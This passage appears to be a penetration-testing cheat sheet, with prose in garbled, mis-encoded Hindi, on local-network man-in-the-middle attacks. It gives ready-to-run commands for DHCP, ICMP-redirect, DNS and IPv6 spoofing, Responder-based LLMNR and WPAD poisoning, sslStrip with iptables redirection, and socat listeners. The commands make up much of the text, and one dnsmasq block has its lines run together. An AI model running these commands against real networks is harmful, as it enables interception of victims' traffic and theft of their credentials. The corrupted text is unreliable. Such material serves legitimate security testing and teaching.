рдЕрдзрд┐рдХрд╛рдВрд╢ Open Shortest Path First (OSPF) рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди MD5 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рд░рд╛рдЙрдЯрд░реНрд╕ рдХреЗ рдмреАрдЪ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред Loki рдФрд░ John the Ripper MD5 рд╣реИрд╢реЗрдЬ рдХреЛ рдХреИрдкреНрдЪрд░ рдФрд░ рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдХреБрдВрдЬреА рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдирдП рдорд╛рд░реНрдЧреЛрдВ рдХреА рдШреЛрд╖рдгрд╛ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдорд╛рд░реНрдЧ рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ _Injection_ рдЯреИрдм рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реЗрдЯ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдФрд░ рдХреБрдВрдЬреА _Connection_ рдХреЗ рддрд╣рдд рд╕реЗрдЯ рдХреА рдЬрд╛рддреА рд╣реИред

рдЗрд╕ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП _**Network Security Assessment: Know Your Network (3rd edition).**_ рдкреБрд╕реНрддрдХ рджреЗрдЦреЗрдВред

### рдЕрдиреНрдп рд╕рд╛рдорд╛рдиреНрдп рдЙрдкрдХрд░рдг рдФрд░ рд╕реНрд░реЛрдд

* [**Above**](https://github.com/c4s73r/Above): рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд┐рдХ рд╕реНрдХреИрди рдХрд░рдиреЗ рдФрд░ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдХрд░рдг
* рдиреЗрдЯрд╡рд░реНрдХ рд╣рдорд▓реЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреБрдЫ рдФрд░ рдЬрд╛рдирдХрд╛рд░реА рдЖрдк [рдпрд╣рд╛рдБ](https://github.com/Sab0tag3d/MITM-cheatsheet) рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред _(TODO: рдЗрд╕реЗ рдкреВрд░рд╛ рдкрдврд╝реЗрдВ рдФрд░ рдирдП рд╣рдорд▓реЛрдВ рдХреЛ рдЬреЛрдбрд╝реЗрдВ рдпрджрд┐ рдХреЛрдИ рд╣реЛ)_

## **Spoofing**

рд╣рдорд▓рд╛рд╡рд░ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдирдП рд╕рджрд╕реНрдп рдХреЗ рд╕рднреА рдиреЗрдЯрд╡рд░реНрдХ рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ (GW, IP, DNS) рдХреЛ рдирдХрд▓реА DHCP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рднреЗрдЬрдХрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рддрд╛ рд╣реИред
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

рдкрд┐рдЫрд▓реЗ рдЕрдиреБрднрд╛рдЧ рдХреЛ [рджреЗрдЦреЗрдВ](./#arp-spoofing)ред

### ICMPRedirect

ICMP Redirect рдореЗрдВ ICMP рдкреИрдХреЗрдЯ рдЯрд╛рдЗрдк 1 рдХреЛрдб 5 рднреЗрдЬрдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ, рдЬреЛ рдпрд╣ рд╕рдВрдХреЗрдд рджреЗрддрд╛ рд╣реИ рдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХрд┐рд╕реА IP рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рдорд╛рд░реНрдЧ рд╣реИред рдлрд┐рд░, рдЬрдм рдкреАрдбрд╝рд┐рдд рдЙрд╕ IP рд╕реЗ рд╕рдВрдкрд░реНрдХ рдХрд░рдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдкреИрдХреЗрдЯ рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬреЗрдЧрд╛ред
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

рд╣рдорд▓рд╛рд╡рд░ рдХреБрдЫ (рдпрд╛ рд╕рднреА) рдбреЛрдореЗрдиреНрд╕ рдХреЛ рд╣рд▓ рдХрд░реЗрдЧрд╛ рдЬрд┐рдирдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдкреАрдбрд╝рд┐рдд рдиреЗ рдкреВрдЫрд╛ рд╣реИред
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**dnsmasq рдХреЗ рд╕рд╛рде рдЕрдкрдирд╛ DNS рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВ**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### рд╕реНрдерд╛рдиреАрдп рдЧреЗрдЯрд╡реЗ

рдкреНрд░рдгрд╛рд▓рд┐рдпреЛрдВ рдФрд░ рдиреЗрдЯрд╡рд░реНрдХреЛрдВ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдХреНрд╕рд░ рдХрдИ рдорд╛рд░реНрдЧ рд╣реЛрддреЗ рд╣реИрдВред рд╕реНрдерд╛рдиреАрдп рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рднреАрддрд░ MAC рдкрддреЗ рдХреА рд╕реВрдЪреА рдмрдирд╛рдиреЗ рдХреЗ рдмрд╛рдж, _gateway-finder.py_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрди рд╣реЛрд╕реНрдЯреНрд╕ рдХреА рдкрд╣рдЪрд╛рди рдХрд░реЗрдВ рдЬреЛ IPv4 рдлреЙрд░рд╡рд░реНрдбрд┐рдВрдЧ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВред
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [LLMNR, NBT-NS рдФрд░ mDNS Spoofing](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Microsoft рд╕рд┐рд╕реНрдЯрдореНрд╕ LLMNR (Link-Local Multicast Name Resolution) рдФрд░ NBT-NS (NetBIOS Name Service) рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕реНрдерд╛рдиреАрдп рд╣реЛрд╕реНрдЯ рд░рд┐рдЬрд╝реЙрд▓реНрдпреВрд╢рди рдХреЗ рд▓рд┐рдП рдХрд░рддреЗ рд╣реИрдВ рдЬрдм DNS рд▓реБрдХрдЕрдк рд╡рд┐рдлрд▓ рд╣реЛ рдЬрд╛рддреЗ рд╣реИрдВред Apple Bonjour рдФрд░ Linux рдЬрд╝реАрд░реЛ-рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди mDNS (Multicast DNS) рдХрд╛ рдЙрдкрдпреЛрдЧ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рднреАрддрд░ рд╕рд┐рд╕реНрдЯрдореНрд╕ рдХреА рдЦреЛрдЬ рдХреЗ рд▓рд┐рдП рдХрд░рддреЗ рд╣реИрдВред рдпреЗ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдЕрдкреНрд░рдорд╛рдгрд┐рдд рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ UDP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрджреЗрд╢ рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ; рдЗрд╕рд▓рд┐рдП, рд╣рдорд▓рд╛рд╡рд░ рдЙрдирдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рд╕реЗрд╡рд╛рдУрдВ рдХреА рдУрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░ рд╕рдХреЗрдВред

рдЖрдк Responder рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрди рд╕реЗрд╡рд╛рдУрдВ рдХреА рдирдХрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдирдХреА рдЦреЛрдЬ рд╣реЛрд╕реНрдЯ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рдирдХрд▓реА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рднреЗрдЬрдХрд░ред\
рдпрд╣рд╛рдБ [Responder рдХреЗ рд╕рд╛рде рд╕реЗрд╡рд╛рдУрдВ рдХреА рдирдХрд▓ рдХреИрд╕реЗ рдХрд░реЗрдВ](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкрдврд╝реЗрдВред

### [WPAD Spoofing](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

рдХрдИ рдмреНрд░рд╛рдЙрдЬрд╝рд░реНрд╕ Web Proxy Auto-Discovery (WPAD) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗ рдкреНрд░реЙрдХреНрд╕реА рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рд▓реЛрдб рдХрд░ рд╕рдХреЗрдВред WPAD рд╕рд░реНрд╡рд░ рдПрдХ рд╡рд┐рд╢реЗрд╖ URL (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, [http://wpad.example.org/wpad.dat](http://wpad.example.org/wpad.dat)) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░реЙрдХреНрд╕реА рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╣рдЪрд╛рдирд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

* DHCP, рдХреЛрдб 252 рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* DNS, рд╕реНрдерд╛рдиреАрдп рдбреЛрдореЗрди рдореЗрдВ _wpad_ рд╣реЛрд╕реНрдЯрдиреЗрдо рдХреА рдЦреЛрдЬ рдХрд░рддреЗ рд╣реБрдП
* Microsoft LLMNR рдФрд░ NBT-NS (DNS рд▓реБрдХрдЕрдк рд╡рд┐рдлрд▓рддрд╛ рдХреА рд╕реНрдерд┐рддрд┐ рдореЗрдВ)

Responder WPAD рд╣рдорд▓реЗ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░рддрд╛ рд╣реИтАФрдПрдХ рдкреНрд░реЙрдХреНрд╕реА рдЪрд▓рд╛рдХрд░ рдФрд░ DHCP, DNS, LLMNR, рдФрд░ NBT-NS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреНрд▓рд╛рдЗрдВрдЯреНрд╕ рдХреЛ рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг WPAD рд╕рд░реНрд╡рд░ рдХреА рдУрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред\
рдпрд╣рд╛рдБ [Responder рдХреЗ рд╕рд╛рде рд╕реЗрд╡рд╛рдУрдВ рдХреА рдирдХрд▓ рдХреИрд╕реЗ рдХрд░реЗрдВ](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкрдврд╝реЗрдВред

### [SSDP рдФрд░ UPnP рдЙрдкрдХрд░рдгреЛрдВ рдХреА Spoofing](spoofing-ssdp-and-upnp-devices.md)

рдЖрдк рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рд╕реЗрд╡рд╛рдПрдБ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЪрдХрдорд╛ рджреЗрдХрд░** рдХреБрдЫ **рдкреНрд▓реЗрди-рдЯреЗрдХреНрд╕реНрдЯ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** рджрд░реНрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░реЗрд░рд┐рдд рдХрд░ рд╕рдХреЗрдВред **рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА** [**SSDP рдФрд░ UPnP рдЙрдкрдХрд░рдгреЛрдВ рдХреА Spoofing**](spoofing-ssdp-and-upnp-devices.md)**рдореЗрдВред**

### IPv6 Neighbor Spoofing

рдпрд╣ рд╣рдорд▓рд╛ ARP Spoofing рдХреЗ рдмрд╣реБрдд рд╕рдорд╛рди рд╣реИ рд▓реЗрдХрд┐рди IPv6 рдХреА рджреБрдирд┐рдпрд╛ рдореЗрдВред рдЖрдк рдкреАрдбрд╝рд┐рдд рдХреЛ рдпрд╣ рд╕реЛрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ GW рдХрд╛ IPv6 рдореИрдХ рдХрд╛ рд╣рдорд▓рд╛рд╡рд░ рд╣реИред
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 рд░рд╛рдЙрдЯрд░ рд╡рд┐рдЬреНрдЮрд╛рдкрди рд╕реНрдкреВрдлрд┐рдВрдЧ/рдлреНрд▓рдбрд┐рдВрдЧ

рдХреБрдЫ OS рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рднреЗрдЬреЗ рдЧрдП RA рдкреИрдХреЗрдЯреНрд╕ рд╕реЗ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЧреЗрдЯрд╡реЗ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рддреЗ рд╣реИрдВред рд╣рдорд▓рд╛рд╡рд░ рдХреЛ IPv6 рд░рд╛рдЙрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдШреЛрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP рд╕реНрдкреВрдлрд┐рдВрдЧ

рдХреБрдЫ OS рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ DHCPv6 рдкреИрдХреЗрдЯ рдкрдврд╝рдХрд░ DNS рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВред рддрдм, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ DHCPv6 рдкреИрдХреЗрдЯ рднреЗрдЬрдХрд░ рдЦреБрдж рдХреЛ DNS рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред DHCP рдкреАрдбрд╝рд┐рдд рдХреЛ рдПрдХ IPv6 рднреА рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (рдирдХрд▓реА рдкреГрд╖реНрда рдФрд░ JS рдХреЛрдб рдЗрдВрдЬреЗрдХреНрд╢рди)

## рдЗрдВрдЯрд░рдиреЗрдЯ рд╣рдорд▓реЗ

### sslStrip

рдореВрд▓ рд░реВрдк рд╕реЗ рдпрд╣ рд╣рдорд▓рд╛ рдХреНрдпрд╛ рдХрд░рддрд╛ рд╣реИ, рдпрджрд┐ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** **HTTP** рдкреГрд╖реНрда рдХреЛ **рдкреНрд░рд╡реЗрд╢** рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ рдЬреЛ **HTTPS** рд╕рдВрд╕реНрдХрд░рдг рдХреА рдУрд░ **рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд** рдХрд░ рд░рд╣рд╛ рд╣реИред **sslStrip** **рдЧреНрд░рд╛рд╣рдХ рдХреЗ рд╕рд╛рде HTTP рдХрдиреЗрдХреНрд╢рди** рдХреЛ **рдмрдирд╛рдП рд░рдЦреЗрдЧрд╛ рдФрд░** **рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде HTTPS рдХрдиреЗрдХреНрд╢рди** рдХреЛ рдЗрд╕рд▓рд┐рдП рдпрд╣ **рд╕рд╛рджреЗ рдкрд╛рда** рдореЗрдВ рдХрдиреЗрдХреНрд╢рди рдХреЛ **рд╕реВрдВрдШрдиреЗ** рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛ред
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [рдпрд╣рд╛рдБ](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf) рдкрд░ рдорд┐рд▓ рд╕рдХрддреА рд╣реИред

### sslStrip+ рдФрд░ dns2proxy рдХрд╛ рдЙрдкрдпреЛрдЧ HSTS рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП

**sslStrip+ рдФрд░ dns2proxy** рдФрд░ **sslStrip** рдХреЗ рдмреАрдЪ рдХрд╛ **рдЕрдВрддрд░** рдпрд╣ рд╣реИ рдХрд┐ рд╡реЗ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП _**www.facebook.com**_ рдХреЛ _**wwww.facebook.com**_ рдореЗрдВ **рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд** рдХрд░реЗрдВрдЧреЗ (рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдПрдХ **рдЕрддрд┐рд░рд┐рдХреНрдд** "**w**" рд╣реИ) рдФрд░ рдЗрд╕ рдбреЛрдореЗрди рдХрд╛ **рдкрддрд╛ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ IP рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрдЯ** рдХрд░реЗрдВрдЧреЗред рдЗрд╕ рддрд░рд╣, **рдХреНрд▓рд╛рдЗрдВрдЯ** _**wwww.facebook.com**_ (рд╣рдорд▓рд╛рд╡рд░) рд╕реЗ **рдЬреБрдбрд╝реЗрдЧрд╛** рд▓реЗрдХрд┐рди рдкрд░реНрджреЗ рдХреЗ рдкреАрдЫреЗ **sslstrip+** **рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдХрдиреЗрдХреНрд╢рди** рдХреЛ https рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **www.facebook.com** рдХреЗ рд╕рд╛рде **рдмрдирд╛рдП рд░рдЦреЗрдЧрд╛**ред

рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ **рд▓рдХреНрд╖реНрдп** HSTS рд╕реЗ **рдмрдЪрдирд╛** рд╣реИ рдХреНрдпреЛрдВрдХрд┐ _**wwww**.facebook.com_ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ **рдХреИрд╢** рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдирд╣реАрдВ рдЬрд╛рдПрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдзреЛрдЦрд╛ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдХрд┐ рд╡рд╣ **facebook рдкреНрд░рдорд╛рдгреАрдХрд░рдг HTTP рдореЗрдВ рдХрд░реЗ**ред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреАрдбрд╝рд┐рдд рдХреЛ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рд░реВрдк рд╕реЗ [http://www.faceook.com](http://www.faceook.com) рдкрд░ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ https рдирд╣реАрдВред рдпрд╣ рдПрдХ http рдкреЗрдЬ рдХреЗ рдЕрдВрджрд░ рдХреЗ рд▓рд┐рдВрдХреНрд╕ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [рдпрд╣рд╛рдБ](https://www.bettercap.org/legacy/#hsts-bypass), [рдпрд╣рд╛рдБ](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) рдФрд░ [рдпрд╣рд╛рдБ](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly) рдкрд░ рдорд┐рд▓ рд╕рдХрддреА рд╣реИред

**sslStrip рдпрд╛ sslStrip+ рдЕрдм рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВред рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдмреНрд░рд╛рдЙрдЬрд╝рд░реЛрдВ рдореЗрдВ рдкрд╣рд▓реЗ рд╕реЗ HSTS рдирд┐рдпрдо рд╕рд╣реЗрдЬреЗ рдЧрдП рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдХреЛрдИ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрд╣рд▓реА рдмрд╛рд░ "рдорд╣рддреНрд╡рдкреВрд░реНрдг" рдбреЛрдореЗрди рддрдХ рдкрд╣реБрдБрдЪрддрд╛ рд╣реИ рддреЛ рд╡рд╣ рдЗрд╕реЗ HTTPS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реА рдПрдХреНрд╕реЗрд╕ рдХрд░реЗрдЧрд╛ред рдпрд╣ рднреА рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкрд╣рд▓реЗ рд╕реЗ рд╕рд╣реЗрдЬреЗ рдЧрдП рдирд┐рдпрдо рдФрд░ рдЕрдиреНрдп рдЙрддреНрдкрдиреНрди рдирд┐рдпрдо [**`includeSubdomains`**](https://hstspreload.appspot.com) рдлреНрд▓реИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдкрд╣рд▓реЗ рдХрд╛ _**wwww.facebook.com**_ рдЙрджрд╛рд╣рд░рдг рдЕрдм рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ _**facebook.com**_ `includeSubdomains` рдХреЗ рд╕рд╛рде HSTS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP рдкреЛрд░реНрдЯ рдкрд░ рд╕реБрдиреЛ
```
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL рдкреЛрд░реНрдЯ рдореЗрдВ рд╕реБрдиреЛ

#### рдХреБрдВрдЬрд┐рдпрд╛рдБ рдФрд░ рд╕реНрд╡-рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВ
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕реБрдиреЗрдВ
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕реБрдиреЗрдВ рдФрд░ рд╣реЛрд╕реНрдЯреНрд╕ рдХреА рдУрд░ рдЕрдиреБрдкреНрд░реЗрд╖рд┐рдд рдХрд░реЗрдВ
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
